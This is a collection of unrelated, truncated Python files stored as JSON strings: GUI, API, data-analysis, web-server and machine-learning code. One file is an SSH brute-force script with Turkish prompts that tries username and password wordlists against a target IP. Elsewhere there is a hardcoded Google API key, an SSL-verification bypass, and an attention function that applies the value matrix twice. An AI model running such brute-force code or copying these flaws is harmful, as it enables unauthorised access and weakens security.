    "from customtkinter import (\n    CTk, CTkFrame, CTkLabel,\n    CTkEntry, CTkButton, CTkComboBox,\n    set_appearance_mode, set_default_color_theme,\n    ThemeManager\n)\nfrom CTkListbox import CTkListbox\nimport util\n\ndef center_window(Screen: CTk, width: int, height: int, scale_factor: float = 1.0):\n    \"\"\"Centers the window to the main display/monitor\"\"\"\n    screen_width = Screen.winfo_screenwidth()\n    screen_height = Screen.winfo_screenheight()\n    x = int(((screen_width/2) - (width/2)) * scale_factor)\n    y = int(((screen_height/2) - (height/1.5)) * scale_factor)\n    return f\"{width}x{height}+{x}+{y}\"\n\nclass LoginFrame(CTkFrame):\n    row_weight = 2\n    column_weight = 2\n    def __init__(self, master, **kwargs):\n        super().__init__(master, **kwargs)\n\n        self.grid_columnconfigure(0, weight=1)\n        self.grid_columnconfigure(1, weight=3)\n\n        CTkLabel(self, text=\"SSH host:\").grid(row=0, column=0, pady=(10,0), sticky=\"e\")\n        self.cmbx_sshosts = CTkComboBox(self, values=[])\n        self.cmbx_sshosts.set(\"\")\n        self.cmbx_sshosts.grid(row=0, column=1, padx=10, pady=(10,0), sticky=\"we\")\n\n        CTkLabel(self, text=\"Username:\").grid(row=1, column=0, pady=(10,0), sticky=\"e\")\n        self.txt_username = CTkEntry(self)\n        self.txt_username.grid(row=1, column=1, padx=10, pady=(10,0), sticky=\"we\")\n\n        CTkLabel(self, text=\"Password:\").grid(row=2, column=0, pady=(10,0), sticky=\"e\")\n        self.txt_password = CTkEntry(self, show=\"*\")\n        self.txt_password.grid(row=2, column=1, padx=10, pady=(10,0), sticky=\"we\")\n\n        self.btn_connect = CTkButton(self, text=\"Connect\")\n        self.btn_connect.grid(row=3, column=1, padx=10, pady=(10,0), sticky=\"e\")\n\n    def set_accessibility(self, val):\n        for k,v in self.children.items():\n            if k != \"!ctkcanvas\":\n                v.configure(state=val)\n\n\nclass DeviceFrame(CTkFrame):\n    row_weight=5\n    column_weight=5\n    def __init__(self, master, **kwargs):\n        super().__init__(master, **kwargs)\n\n        self.grid_columnconfigure(0, weight=1)\n        self.grid_columnconfigure(1, weight=5)\n        self.grid_columnconfigure(2, weight=1)\n        self.grid_columnconfigure(3, weight=1)\n\n        self.btn_spawn_shell = CTkButton(self, text=\"Spawn Shell\", state=\"normal\")\n        self.btn_spawn_shell.grid(row=0, column=1, padx=0, pady=(10, 0), sticky=\"w\")\n\n        CTkLabel(self, text=\"Consoles:\").grid(row=1, column=0, pady=(10, 0), sticky=\"e\")\n        self.cmbx_consoles = CTkComboBox(self, values=[])\n        self.cmbx_consoles.set(\"\")\n        self.cmbx_consoles.grid(row=1, column=1, padx=(3,1), pady=(10,0), sticky=\"we\")\n        self.btn_consoles_refresh = CTkButton(self, text=\"\u21ba\", state=\"disabled\", width=26)\n        self.btn_consoles_refresh.grid(row=1, column=2, padx=0, pady=(10, 0))\n\n        self.btn_spawn_console = CTkButton(self, text=\"Spawn\", state=\"disabled\")\n        self.btn_spawn_console.grid(row=1, column=3, padx=(3,1), pady=(10,0), sticky=\"w\")\n\n        CTkLabel(self, text=\"Local Networks:\").grid(row=2, column=0, pady=(10,0), sticky=\"e\")\n        self.cmbx_nics = CTkComboBox(self, values=[])\n        self.cmbx_nics.set(\"\")\n        self.cmbx_nics.grid(row=2, column=1, padx=(3,1), pady=(10,0), sticky=\"we\")\n        self.btn_nics_refresh = CTkButton(self, text=\"\u21ba\", state=\"disabled\", width=26)\n        self.btn_nics_refresh.grid(row=2, column=2, padx=0, pady=(10, 0))\n\n        CTkLabel(self, text=\"Found nodes:\").grid(row=3, column=0, pady=(10, 0), sticky=\"ne\")\n        self.lbx_nodes = CTkListbox(self,  button_color=\"#1F6AA5\", hover_color=\"#3D81FF\",\n                                    highlight_color=\"#3D81FF\", height=200)\n        self.lbx_nodes.grid(row=3, column=1, padx=(3,1), pady=(10, 0), sticky=\"nswe\")\n        self.btn_nodes_refresh = CTkButton(self, text=\"\u21ba\", state=\"disabled\", width=26)\n        self.btn_nodes_refresh.grid(row=3, column=2, padx=0, pady=(10, 0), sticky=\"s\")\n\n\n        self.btn_tunnel_https = CTkButton(self, text=\"Tunnel HTTPS\", state=\"disabled\")\n        self.btn_tunnel_https.grid(row=3, column=3, padx=(3,1), pady=(10,0), sticky=\"sw\")\n\n\n    def add_lbx_node(self, node):\n        self.lbx_nodes.insert(node, node, height=20)\n        self.lbx_nodes.buttons[node].pack_configure(pady=(0,1))\n\n    def extend_lbx_nodes(self, node_port_map, handler):\n        for n,p in node_port_map.items():\n            self.lbx_nodes.buttons[n].port = p\n            self.lbx_nodes.buttons[n].bind('<Double-Button-1>',handler)\n\n    def get_selected_lbx_node_port(self):\n        node = self.lbx_nodes.get()\n        return self.lbx_nodes.buttons[node].port\n\n    def empty_lbx_nodes(self):\n        self.lbx_nodes.delete(\"all\")\n\n\nclass RcUI(CTk):\n    ICO_PATH = util.get_path(\"static/app.ico\")\n    def __init__(self, title):\n        super().__init__()\n        self.frames = {}\n\n        set_appearance_mode(\"dark\")  # Modes: system (default), light, dark\n        set_default_color_theme(\"blue\")  # Themes: blue (default), dark-blue, green\n\n        self.frames[\"log",
    "from googleapiclient.discovery import build\r\nimport pymongo\r\nimport psycopg2\r\nimport pandas as pd\r\nimport streamlit as st\r\n\r\n\r\ndef api_connect():\r\n    api_id = \"AIzaSyD55if73ztupEY--Ia4TCttuBofq-sVHCg\"\r\n\r\n    api_service_name = \"youtube\"\r\n    api_version = \"v3\"\r\n\r\n    youtube = build(api_service_name,api_version,developerKey=api_id)\r\n\r\n    return youtube\r\n\r\nyoutube = api_connect()\r\n\r\n\r\ndef get_channel_info(channel_id):\r\n    request = youtube.channels().list(\r\n            part=\"snippet,contentDetails,statistics\",\r\n            id=channel_id\r\n        )\r\n    response = request.execute()\r\n    \r\n    for i in response['items']:\r\n        data = dict(channel_name=i['snippet']['title'],\r\n                    channel_id=i['id'],\r\n                    subscribers=i['statistics']['subscriberCount'],\r\n                    views=i['statistics']['viewCount'],\r\n                    total_videos=i['statistics']['videoCount'],\r\n                    channel_description=i['snippet']['description'],\r\n                    playlist_Id=i['contentDetails']['relatedPlaylists']['uploads'])\r\n        return data\r\n\r\n\r\n#get video ids\r\ndef get_videos_ids(channel_id):\r\n    video_ids=[]\r\n\r\n    response=youtube.channels().list(id=channel_id,\r\n                                    part= 'contentDetails').execute()\r\n    playlist_Id=response['items'][0]['contentDetails']['relatedPlaylists']['uploads']\r\n\r\n    next_page_token=None\r\n\r\n    while True:\r\n        response1=youtube.playlistItems().list(\r\n                                            part='snippet',\r\n                                            playlistId=playlist_Id,\r\n                                            maxResults=50,\r\n                                            pageToken=next_page_token).execute()\r\n        for i in range(len(response1['items'])):\r\n            video_ids.append(response1['items'][i]['snippet']['resourceId']['videoId'])\r\n        next_page_token=response1.get('nextPageToken')\r\n\r\n        if next_page_token is None:\r\n            break    \r\n    return video_ids    \r\n\r\n#get video information\r\ndef get_video_info(video_ids):\r\n    video_data=[]\r\n\r\n    for video_id in video_ids:\r\n        request=youtube.videos().list(\r\n            part=\"snippet,contentDetails,statistics\",\r\n            id=video_id\r\n        )\r\n        response=request.execute()\r\n\r\n        for item in response[\"items\"]:\r\n            data=dict(Channel_Name=item['snippet']['channelTitle'],\r\n                    Channel_Id=item['snippet']['channelId'],\r\n                    Video_Id=item['id'],\r\n                    Title=item['snippet']['title'],\r\n                    Tags=item['snippet'].get('tags'),\r\n                    Thumbnail=item['snippet']['thumbnails']['default']['url'],\r\n                    Description=item['snippet'].get('description'),\r\n                    Published_Date=item['snippet']['publishedAt'],\r\n                    Duration=item['contentDetails']['duration'],\r\n                    Views=item['statistics'].get('viewCount'),\r\n                    Likes=item['statistics'].get('likeCount'),\r\n                    Comments=item['statistics'].get('commentCount'),\r\n                    Favourite_Count=item['statistics']['favoriteCount'],\r\n                    Definition=item['contentDetails']['definition'],\r\n                    Caption_Status=item['contentDetails']['caption']\r\n                    )\r\n            video_data.append(data)\r\n    return video_data    \r\n\r\n#get comment information\r\ndef get_comment_info(video_ids):\r\n    Comment_data=[]\r\n    try:\r\n        for video_id in video_ids:\r\n            request=youtube.commentThreads().list(\r\n                part=\"snippet\",\r\n                videoId=video_id,\r\n                maxResults=50\r\n            )\r\n            response=request.execute()\r\n\r\n            for item in response['items']:\r\n                data=dict(Comment_id=item['snippet']['topLevelComment']['id'],\r\n                        Video_Id=item['snippet']['topLevelComment']['snippet']['videoId'],\r\n                        Comment_Text=item['snippet']['topLevelComment']['snippet']['textDisplay'],\r\n                        Comment_Author=item['snippet']['topLevelComment']['snippet']['authorDisplayName'],\r\n                        Comment_Published=item['snippet']['topLevelComment']['snippet']['publishedAt'])\r\n                \r\n                Comment_data.append(data)\r\n\r\n    except:\r\n        pass\r\n    return Comment_data\r\n\r\n\r\n#get playlist details\r\ndef get_playlist_details(channel_id):\r\n\r\n    next_page_token=None\r\n    All_data=[]\r\n    while True:\r\n            request=youtube.playlists().list(\r\n                part='snippet,contentDetails',\r\n                channelId=channel_id,\r\n                maxResults=50,\r\n                pageToken=next_page_token\r\n            )\r\n            response=request.execute()\r\n\r\n            for item in response['items']:\r\n                    data=dict(Playlist_Id=item['id'],\r\n                            Title=item['snippet']['title'],\r\n                            Channel_Id=item['snippet",
    "\"\"\"\n====================================\nHooks factory for various behaviours\n====================================\n\n:Authors: - Florian Dupeyron <florian.dupeyron@mugcat.fr>\n:Date: April 2024\n\"\"\"\n\nimport re\nimport asyncio\n\nfrom   functools import partial\n\n###########################################\n\ndef wait_for_str_re(regex):\n   # Ensure regex is a compiled regex\n   if not isinstance(regex, re.Pattern):\n      regex = re.compile(regex)\n\n   async def wait_for_str_re_impl(task, regex):\n      task.log.info(f\"Waiting for '{task.name}' to be ready!\")\n\n      ready = False\n      queue = asyncio.Queue()\n\n      try:\n         await task.stderr_listeners.register(queue)\n         while not ready:\n            line = await queue.get()\n            if regex.search(line):\n               ready = True\n               task.set_ready()\n\n      finally:\n         await task.stderr_listeners.unregister(queue)\n   \n   return partial(wait_for_str_re_impl, regex=regex)\n\ndef wait_for_seconds(nseconds):\n   async def wait_for_seconds_impl(task, seconds):\n      task.log.info(f\"Wait for {seconds}s before considering '{task.name}' ready\")\n      await asyncio.sleep(seconds)\n      task.set_ready()\n\n   return partial(wait_for_seconds_impl, seconds=nseconds)\n",
    "import argparse\nimport glob\nimport http.server\nimport importlib.resources\nimport io\nimport json\nimport mimetypes\nimport os\nimport shutil\nimport subprocess\nimport sys\nimport urllib.parse\n\nif (\n    sys.version_info.major,\n    sys.version_info.minor,\n) < (3, 11):\n    import tomli as toml\nelse:\n    import tomllib as toml\n\n\ndef resolve_git_repo(url, ssh=False):\n    if (\n        not url.startswith(\"http\")\n        and not url.startswith(\"ssh\")\n        and not url.startswith(\"git@\")\n    ):\n        url = f\"git@github.com:{url}.git\" if ssh else f\"https://github.com/{url}\"\n    plugin_dir = \"/\".join(url.split(\":\")[-1].split(\"/\")[-2:]).strip(\".git\")\n    return url, plugin_dir\n\n\ndef installed_plugins(plugin_dir):\n    index = \"index.html\"\n    prefix_len = len(plugin_dir) + 1\n    postfix_len = len(index) + 1\n    plugins = []\n    for m in glob.glob(f\"{plugin_dir}/**/{index}\", recursive=True):\n        directory = m[prefix_len:-postfix_len]\n        plugin = {\"name\": directory}\n        config_path = os.path.join(plugin_dir, directory, \"fss.toml\")\n        if os.path.exists(config_path):\n            with open(config_path, \"rb\") as fd:\n                plugin.update(toml.load(fd))\n        plugin[\"directory\"] = directory\n        plugins.append(plugin)\n    return sorted(plugins, key=lambda m: m[\"name\"])\n\n\ndef git(*args, cwd=None, help_message=\"\"):\n    assert cwd is not None\n    try:\n        subprocess.run([\"git\", \"-C\", cwd, *args], check=True)\n    except FileNotFoundError:\n        print(\n            \"Error: git command not found, git is required for plugin install / update\",\n            file=sys.stderr,\n        )\n        sys.exit(1)\n    except subprocess.CalledProcessError:\n        print(f\"Error: {help_message}\", file=sys.stderr)\n        sys.exit(1)\n\n\ndef install(args):\n    repo, plugin_dir = resolve_git_repo(args.plugin, ssh=args.ssh)\n    git(\n        \"clone\",\n        repo,\n        plugin_dir,\n        cwd=args.plugin_dir,\n        help_message=\"Perhaps the plugin specified is already installed, did you mean to run `update`?\",\n    )\n    print(\"Succesfully installed:\", plugin_dir)\n\n\ndef update(args):\n    plugins = (\n        args.plugins if len(args.plugins) > 0 else installed_plugins(args.plugin_dir)\n    )\n    for plugin in plugins:\n        repo, plugin_dir = resolve_git_repo(plugin[\"directory\"])\n        cwd = os.path.join(args.plugin_dir, plugin_dir)\n        if not os.path.exists(os.path.join(cwd, \".git\")):\n            print(\n                \"Warning: plugin is not git repo, skipping:\",\n                plugin_dir,\n                file=sys.stderr,\n            )\n            continue\n        git(\n            \"pull\",\n            cwd=cwd,\n            help_message=\"Perhaps the plugin isn't already installed, did you mean to run `install`?\",\n        )\n        print(\"Succesfully updated:\", plugin_dir)\n\n\ndef serve(args):\n    class PluginRequestHandler(http.server.BaseHTTPRequestHandler):\n        cwd = \"/\"\n\n        def send_file(\n            self, f, fsize, ctype, encoding=None, last_modified=None, revalidate=False\n        ):\n            self.send_response(http.server.HTTPStatus.OK)\n            self.send_header(\"Content-type\", ctype)\n            self.send_header(\"Content-Length\", str(fsize))\n            if encoding is not None:\n                self.send_header(\"Content-Encoding\", encoding)\n            if last_modified is not None:\n                self.send_header(\"Last-Modified\", last_modified)\n            if revalidate:\n                self.send_header(\"Cache-Control\", \"no-cache\")\n            self.end_headers()\n            return f\n\n        def send_as_json(self, d):\n            text_io = io.TextIOWrapper(io.BytesIO(), encoding=\"utf-8\")\n            json.dump(d, text_io)\n            f = text_io.detach()\n            fsize = f.tell()\n            f.seek(0)\n            return self.send_file(f, fsize, \"application/json\")\n\n        def send_file_at_path(self, path, revalidate=False):\n            if not os.path.exists(path):\n                return self.send_error(\n                    http.server.HTTPStatus.NOT_FOUND, f\"File not found {path}\"\n                )\n            if os.path.isdir(path):\n                return self.send_error(\n                    http.server.HTTPStatus.BAD_REQUEST,\n                    f\"File attempting to open is directory {path}\",\n                )\n            ctype, encoding = mimetypes.guess_type(path)\n            if ctype is None:\n                ctype = \"application/octet-stream\"\n            f = open(path, \"rb\")\n            fs = os.fstat(f.fileno())\n            return self.send_file(\n                f,\n                fs[6],\n                ctype,\n                encoding=encoding,\n                last_modified=self.date_time_string(fs.st_mtime),\n                revalidate=revalidate,\n            )\n\n        def redirect(self, url):\n            self.send_response(http.server.HTTPStatus.FOUND)\n            self.send_header(\"Location\", url)\n            self.end_headers()\n\n        @staticmethod\n        def query_list():\n       ",
    "import urllib.request\nimport json\nimport os\nimport ssl\n\nfrom dotenv import load_dotenv\nload_dotenv()\n\n# for connecting off-proxy\n# os.environ['https_proxy'] = ''\n# os.environ['http_proxy'] = ''\n# os.environ['no_proxy'] = ''\n# os.environ['HTTPS_PROXY'] = ''\n# os.environ['HTTP_PROXY'] = ''\n# os.environ['NO_PROXY'] = ''\n\ndef allowSelfSignedHttps(allowed):\n    # bypass the server certificate verification on client side\n    if allowed and not os.environ.get('PYTHONHTTPSVERIFY', '') and getattr(ssl, '_create_unverified_context', None):\n        ssl._create_default_https_context = ssl._create_unverified_context\n\nallowSelfSignedHttps(True) # this line is needed if you use self-signed certificate in your scoring service.\n\n# Request data goes here\n# The example below assumes JSON formatting which may be updated\n# depending on the format your endpoint expects.\n# More information can be found here:\n# https://docs.microsoft.com/azure/machine-learning/how-to-deploy-advanced-entry-script\ndata = {\"chat_history\": [{\"inputs\": {\"question\": \"Who is Albert Einstein?\"}, \"outputs\": {\"answer\": \"Albert Einstein was a sicentist.'.\"}}], \"question\": \"summarize the conversatio above?\"}\ndata = {\"chat_history\": [{\"inputs\": {\"question\": \"Who is Albert Einstein?\"}, \"outputs\": {\"answer\": \"Albert Einstein was a sicentist.'.\"}}], \"question\": \"summarize the conversatio above?\"}\n\nbody = str.encode(json.dumps(data))\n\nurl = 'https://shahml-hhrub.eastus.inference.ml.azure.com/score'\n# Replace this with the primary/secondary key or AMLToken for the endpoint\napi_key = os.environ['AZURE_ENDPOINT']\nif not api_key:\n    raise Exception(\"A key should be provided to invoke the endpoint\")\n\n# The azureml-model-deployment header will force the request to go to a specific deployment.\n# Remove this header to have the request observe the endpoint traffic rules\nheaders = {'Content-Type':'application/json', 'Authorization':('Bearer '+ api_key), 'azureml-model-deployment': 'shahml-hhrub-1' }\n\nreq = urllib.request.Request(url, body, headers)\n\ntry:\n    response = urllib.request.urlopen(req)\n\n    result = response.read()\n    print(result)\nexcept urllib.error.HTTPError as error:\n    print(\"The request failed with status code: \" + str(error.code))\n\n    # Print the headers - they include the requert ID and the timestamp, which are useful for debugging the failure\n    print(error.info())\n    print(error.read().decode(\"utf8\", 'ignore'))",
    "import socket  \nfrom colorama import Fore  \nimport paramiko  \nimport threading  \n\nip = input(\"Hedef \u0130p Giriniz : \")\nport = 22\n\ndef port_tara(ip, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(1.25)\n        s.connect((ip, port))\n        print(Fore.GREEN + \"{} [\u221a] portu a\u00e7\u0131k. L\u00fctfen Bekleyin...\".format(port))\n        s.close()\n    except socket.error:\n        print(Fore.RED + \"{} [\u00d7] portu kapal\u0131. Tool'dan \u00e7\u0131k\u0131l\u0131yor...\".format(port))\n        exit()\n        \n        \nusernamelist = input(\"SSH kullan\u0131c\u0131 ad\u0131 wordlistini giriniz: \")\npasswordlist = input(\"SSH \u015fifre wordlistini giriniz: \")\n\ndef ssh_brute():\n    ssh = paramiko.SSHClient()\n    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n    with open(usernamelist, 'r') as users:\n        with open(passwordlist, 'r') as passwords:\n            for username in users:\n                username = username.strip() \n                for password in passwords:\n                    password = password.strip()\n                    try:\n                        ssh.connect(hostname=ip, port=port, username=username, password=password)\n                        print(Fore.GREEN + \"[\u2713] Ba\u015far\u0131l\u0131. \u015eifre ve Kullan\u0131c\u0131 ad\u0131 Bulundu \", \"Kullan\u0131c\u0131 Ad\u0131:\", username, \"\u015eifre:\", password)\n                        ssh.close()\n                        return\n                    except paramiko.AuthenticationException:\n                        print(Fore.RED + \"[\u00d7] Ba\u015far\u0131s\u0131z Kullan\u0131c\u0131 ad\u0131 ve \u015eifre Bulunamad\u0131\")\n                    except paramiko.SSHException as e:\n                        print(Fore.RED + f\"[\u00d7] SSH ba\u011flant\u0131 hatas\u0131: {e}\")\n                        \n                        \nport_tara(ip, port)\nstart = therading.Thread(target=ssh_brute)\nstart.start()\n                  \n",
    "# 5.Korelasyon Analizi\r\nimport numpy as np\r\nimport pandas as pd\r\nimport seaborn as sns\r\nimport matplotlib.pyplot as plt\r\n\r\npd.set_option(\"display.max_columns\", None)\r\npd.set_option(\"display.max_rows\", None)\r\npd.set_option(\"display.width\", 500)\r\ndf = pd.read_csv(\"datasets/breast_cancer.csv\")\r\ndf = df.iloc[:, 1:-1]\r\ndf.head()\r\ndf.info()\r\n\r\nnum_col = [col for col in df.columns if df[col].dtype in [\"float64\"]]\r\n\r\ncorr = df[num_col].corr()\r\n# \u00e7ok y\u00fcksek korelasyonlu de\u011fi\u015fkenler asl\u0131nda ayn\u0131 \u015feyi ifade ettikleri i\u00e7in birini d\u0131\u015far\u0131da b\u0131rakmak gerekir\r\n\r\nsns.set(rc={\"figure.figsize\": (12, 12)})\r\nsns.heatmap(corr, cmap=\"RdBu\")\r\nplt.show()\r\n\r\n# Y\u00fcksek Korelasyonlu De\u011fi\u015fkenlerin Silinmesi\r\ncorr_matrix = df.corr().abs()  # -1'de olsa 1'de y\u00fcksek korelasyon demektir ve istenmez\r\n\r\nupper_triangle_matrix = corr_matrix.where(np.triu(np.ones(corr_matrix.shape), k=1).astype(bool))\r\ndrop_list = [col for col in upper_triangle_matrix.columns if any(upper_triangle_matrix[col] > 0.90)]\r\ncorr_matrix[drop_list]\r\ndf.drop(drop_list, axis=1)\r\n\r\n\r\ndef high_correlated_cols(dataframe, plot=False, corr_th=0.90):\r\n    corr = dataframe.corr()\r\n    corr_matrix = corr.abs()\r\n    upper_triangle_matrix = corr_matrix.where(np.triu(np.ones(corr_matrix.shape), k=1).astype(bool))\r\n    drop_list = [col for col in upper_triangle_matrix.columns if any(upper_triangle_matrix[col] > 0.90)]\r\n    if plot:\r\n        import seaborn as sns\r\n        import matplotlib.pyplot as plt\r\n        sns.set(rc={\"figure.figsize\": (12, 12)})\r\n        sns.heatmap(corr_matrix, cmap=\"RdBu\")\r\n        plt.show()\r\n    return drop_list\r\n\r\n\r\ndrop_list = high_correlated_cols(df, plot=True)\r\ndf.drop(drop_list, axis=1)\r\nhigh_correlated_cols(df.drop(drop_list, axis=1), plot=True)",
    "from forecastcmd.config import zip_codes_dict\nfrom forecastcmd.constants import (CELSIUS_STRS, FAHRENHEIT_STRS)\nfrom forecastcmd.regexes import ValidationRegexes\n\n\nclass HTMLElementNotFoundError(Exception):\n    \"\"\"\n    Exception raised raised when a given HTML element cannot be \n        found.\n    \"\"\"\n\n\nclass InvalidTempScaleError(Exception):\n    \"\"\"\n    Exception raised when the provided temperature scale string is \n        invalid.\n    \"\"\"\n\n\nclass InvalidUrlFormatError(Exception):\n    \"\"\"\n    Exception raised when the provided string does not match \n        weather.gov's forecast URL syntax.\n    \"\"\"\n\n\nclass InvalidZipCodeFormatError(Exception):\n    \"\"\"\n    Exception raised when the provided string is not a valid zip code.\n    \"\"\"\n\n\nclass NoTempScaleError(Exception):\n    \"\"\"\n    Exception raised when the provided temperature scale string is \n        empty.\n    \"\"\"\n\n\nclass NoDataForZipCodeError(Exception):\n    \"\"\"\n    Exception raised when there is no data available for the given zip \n        code.\n    \"\"\"\n\n\nclass NoZipCodeError(Exception):\n    \"\"\"Exception raised when the provided string is empty.\"\"\"\n\n\nclass ZipCodeNotFoundError(Exception):\n    \"\"\"\n    Exception raised when the zip code string is not found in the given \n        JSON file.\n    \"\"\"\n\n\ndef validate_temp_scale(temp_scale) -> None:\n    \"\"\"\n    Validates the temperature scale string by checking whether the \n        string is in the sets CELSIUS_STRS or FAHRENHEIT_STRS.\n    \n    Args:\n        temp_scale (str): A string representing a temperature scale.\n    \"\"\"\n    if temp_scale == '':\n        raise NoTempScaleError('No temperature scale entered.')\n    elif temp_scale not in CELSIUS_STRS and temp_scale not in FAHRENHEIT_STRS:\n        raise InvalidTempScaleError('Not a valid temperature scale.')\n\n\ndef validate_zip_code(zip_code) -> None:\n    \"\"\"\n    Validates the zip code string passed into the function by checking \n        whether the string is only a sequence of five digits.\n\n    Args:\n        zip_code (str): A string representing a zip code.\n    \"\"\"\n    if zip_code == '':\n        raise NoZipCodeError('No zip code entered.')\n    elif not ValidationRegexes.zip_code_regex.match(zip_code):\n        raise InvalidZipCodeFormatError('Invalid zip code format.')\n    elif zip_code not in zip_codes_dict:\n        raise ZipCodeNotFoundError('Zip code not found.')\n    elif zip_codes_dict[zip_code] == '':\n        raise NoDataForZipCodeError(f'No data available for {zip_code}.')\n\n\ndef validate_url(url) -> None:\n    \"\"\"\n    Validates the URL string passed into the function by checking \n        whether the string matches weather.gov's forecast URL syntax.\n    \n    Args:\n        url (str): A string representing a URL.\n    \n    Returns:\n        None\n    \"\"\"\n    if not ValidationRegexes.url_regex.match(url):\n        raise InvalidUrlFormatError('Invalid URL for that zip code.')",
    "import click\nfrom dotenv import load_dotenv\nimport cv2\n\nfrom model import create\nfrom model import trigger_dalle\nfrom model import save_file\n\n@click.command()\n@click.option('--mode', default=None, help='create a new image using Dall-E or a variation of an existing image, options - v/C')\n@click.option('--image_path', default=None, help='path to the image')\n@click.option('--prompt', default=None, help='prompt to create/edit the image')\n@click.option('--palette_count', default=10, help='number of colors for your palette')\ndef run(mode, image_path, prompt, palette_count):\n    load_dotenv()\n    click.echo(\"Welcome to Paint By Numbers\")\n    if mode == 'C' and not prompt:\n        click.echo(\"Please enter a prompt\")\n        return \n    if mode == 'v' and not image_path:\n        click.echo(\"Please enter a path\")\n        return\n    \n    image_path = trigger_dalle(image_path, prompt, mode)\n    pbk_image = create(image_path, n_clusters=palette_count)\n    pbk_image_path = save_file(pbk_image, prompt)\n    click.echo(pbk_image_path)\n\n    cv2.imshow('PBK Image', pbk_image)\n    cv2.waitKey(0)\n    cv2.destroyAllWindows()\n\n\n\nif __name__ == '__main__':\n    run()",
    "\"\"\"\nBased on https://github.com/karpathy/nanoGPT/blob/master/model.py\n\nFull definition of a GPT Language Model, all of it in this single file.\nReferences:\n1) the official GPT-2 TensorFlow implementation released by OpenAI:\nhttps://github.com/openai/gpt-2/blob/master/src/model.py\n2) huggingface/transformers PyTorch implementation:\nhttps://github.com/huggingface/transformers/blob/main/src/transformers/models/gpt2/modeling_gpt2.py\n\"\"\"\n\nimport math\nfrom typing import Callable\n\nimport torch\nimport torch.nn as nn\nfrom rich import print\nfrom torch.nn import functional as F\nfrom torch.optim import lr_scheduler\n\n\ndef attn_scale_len(k: torch.Tensor) -> float:\n    # tf-as-st style\n    return 1.0 / k.size(-2)\n\n\ndef attn_scale_hs_sqrt(k: torch.Tensor) -> float:\n    # standard style\n    return 1.0 / math.sqrt(k.size(-1))\n\n\nclass LayerNorm(nn.Module):\n    \"\"\" LayerNorm but with an optional bias. PyTorch doesn't support simply bias=False \"\"\"\n\n    def __init__(self, ndim, bias):\n        super().__init__()\n        self.weight = nn.Parameter(torch.ones(ndim))\n        self.bias = nn.Parameter(torch.zeros(ndim)) if bias else None\n\n    def forward(self, input):\n        return F.layer_norm(input, self.weight.shape, self.weight, self.bias, 1e-5)\n\n\ndef self_attention(\n        k: torch.Tensor,\n        q: torch.Tensor,\n        v: torch.Tensor,\n        bias: torch.Tensor,\n        enable_causal_mask: bool,\n        activation: Callable[[torch.Tensor], torch.Tensor],\n        attn_scale: Callable[[torch.Tensor], float]\n) -> tuple[torch.Tensor, torch.Tensor]:\n    T = k.size(-2)\n    att = (q @ k.transpose(-2, -1)) * attn_scale(k)\n    if enable_causal_mask:\n        att = att.masked_fill(bias[:, :, :T, :T] == 0, float('-inf'))\n    att = activation(att) @ v\n    y = att @ v\n    return y, att\n\n\nclass SelfAttention(nn.Module):\n\n    def __init__(self,\n                 num_embed: int,\n                 num_heads: int,\n                 activation: Callable[[torch.Tensor], torch.Tensor],\n                 attn_scale: Callable[[torch.Tensor], float],\n                 flash_attention: bool,\n                 enable_bias: bool,\n                 enable_causal_mask: bool,\n                 enable_proj: bool,\n                 num_tokens: int,\n                 ):\n        super().__init__()\n        assert num_embed % num_heads == 0\n        # key, query, value projections for all heads, but in a batch\n        self.c_attn = nn.Linear(num_embed, 3 * num_embed, bias=enable_bias)\n        # output projection\n        self.c_proj = nn.Linear(num_embed, num_embed, bias=enable_bias) if enable_proj else nn.Identity()\n\n        self.num_heads = num_heads\n        self.num_embed = num_embed\n        self.self_attention = self_attention\n        self.activation = activation\n        self.attn_scale = attn_scale\n        self.flash_attention = flash_attention\n\n        self.enable_causal_mask = enable_causal_mask\n        self.bias = None\n        if self.enable_causal_mask:\n            self.register_buffer(\"bias\", torch.tril(torch.ones(num_tokens, num_tokens))[None, None])\n\n    def forward(self, x):\n        B, T, C = x.size()  # batch size, sequence length, embedding dimensionality (n_embd)\n\n        # calculate query, key, values for all heads in batch and move head forward to be the batch dim\n        q, k, v = self.c_attn(x).split(self.num_embed, dim=2)\n        k = k.view(B, T, self.num_heads, C // self.num_heads).transpose(1, 2)  # (B, nh, T, hs)\n        q = q.view(B, T, self.num_heads, C // self.num_heads).transpose(1, 2)  # (B, nh, T, hs)\n        v = v.view(B, T, self.num_heads, C // self.num_heads).transpose(1, 2)  # (B, nh, T, hs)\n\n        if self.flash_attention:\n            # causal self-attention; Self-attend: (B, nh, T, hs) x (B, nh, hs, T) -> (B, nh, T, T)\n            # efficient attention using Flash Attention CUDA kernels\n            y = torch.nn.functional.scaled_dot_product_attention(q, k, v, attn_mask=None,\n                                                                 dropout_p=0,\n                                                                 is_causal=self.enable_causal_mask)\n        else:\n            # to get attention matrix\n            y, att = self.self_attention(k, q, v, self.bias, self.enable_causal_mask, self.activation, self.attn_scale)\n\n        y = y.transpose(1, 2).contiguous().view(B, T, C)  # re-assemble all head outputs side by side\n\n        # output projection\n        y = self.c_proj(y)\n        return y\n\n\nclass MLP(nn.Module):\n\n    def __init__(self,\n                 num_embed: int,\n                 activation: Callable[[torch.Tensor], torch.Tensor],\n                 enable_bias: bool,\n                 ):\n        super().__init__()\n        self.c_fc = nn.Linear(num_embed, 4 * num_embed, bias=enable_bias)\n        self.c_proj = nn.Linear(4 * num_embed, num_embed, bias=enable_bias)\n        self.activation = activation\n\n    def forward(self, x):\n        x = self.c_fc(x)\n        x = self.activation(x)\n        x = self.c_proj(x)\n        return x\n\n\nclass B",
